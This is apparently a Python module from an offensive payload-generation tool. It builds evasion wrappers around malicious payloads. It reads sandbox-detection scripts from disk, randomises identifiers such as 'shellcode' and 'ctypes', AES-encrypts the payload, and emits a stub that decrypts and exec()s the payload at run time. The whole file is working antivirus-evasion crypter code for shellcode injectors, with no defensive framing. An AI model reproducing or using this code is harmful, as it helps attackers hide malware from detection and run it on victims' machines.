from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode
import random
import string
import re
import blessed

t = blessed.Terminal()


def randomVar():
    return ''.join(random.sample(string.ascii_lowercase, 8))


def randomJunk():
    newString = ''
    for i in range(random.randint(1, 10)):
        newString += ''.join(random.sample(string.ascii_lowercase, random.randint(1, 26)))
    return newString


def getSandboxScripts(sandboxLang='python'):
    sandboxScripts = ''
    from .menu import sandboxMenuOptions
    for i in sandboxMenuOptions:
        if sandboxMenuOptions[str(i)]['availablemodules']:
            payloadChoice = sandboxMenuOptions[str(i)]['payloadchoice']
            if sandboxLang == 'python':
                sandboxContent = open('lib/sandbox/python/' + payloadChoice + '.py', 'r').read()
            elif sandboxLang == 'powershell':
                sandboxContent = open('lib/sandbox/powershell/' + payloadChoice + '.ps1', 'r').read()

            rex = re.search('\*([^\*]*)\*.*\$([^\*]..*)\$', sandboxContent) # Regex is ugly pls help
            if rex:
                originalString, scriptVariable, variableValue = rex.group(), rex.group(1), rex.group(2)
                setVariable = input(t.bold_green + '\n[!] {} Sandbox Script Configuration:\n'.format(payloadChoice) + t.bold_red + '[*] {}? [{}]:'.format(scriptVariable, variableValue)  + t.normal)
                if setVariable:
                    try:
                        int(setVariable)
                    except:
                        setVariable = "'{}'".format(setVariable)
                    variableValue = setVariable
                newString = scriptVariable + ' = ' + variableValue
                sandboxContent = sandboxContent.replace(originalString, newString)
            sandboxScripts += sandboxContent
    return sandboxScripts


def do_Encryption(payload):
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CTR)

    randshellcode = randomJunk()
    randbuf = randomJunk()
    randptr = randomJunk()
    randht = randomJunk()
    randctypes = randomJunk()

    payload = payload.replace('ctypes', randctypes)
    payload = payload.replace('shellcode', randshellcode)
    payload = payload.replace('bufe', randbuf)
    payload = payload.replace('ptr', randptr)
    payload = payload.replace('ht', randht)

    ct_bytes = cipher.encrypt(payload.encode())
    nonce = b64encode(cipher.nonce).decode('utf-8')
    ct = b64encode(ct_bytes).decode('utf-8')

    injector = "#!/usr/bin/env python3\n"
    injector += "from Crypto.Cipher import AES\n"
    injector += "from base64 import b64decode\n"
    injector += "import ctypes as {}\n".format(randctypes)
    injector += "key = {}\n".format(key)
    injector += "ct = b64decode('{}')\n".format(ct)
    injector += "nonce = b64decode('{}')\n".format(nonce)
    injector += "cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)\n"
    injector += "pt = cipher.decrypt(ct)\n"
    injector += "exec(pt.decode())"

    return injector
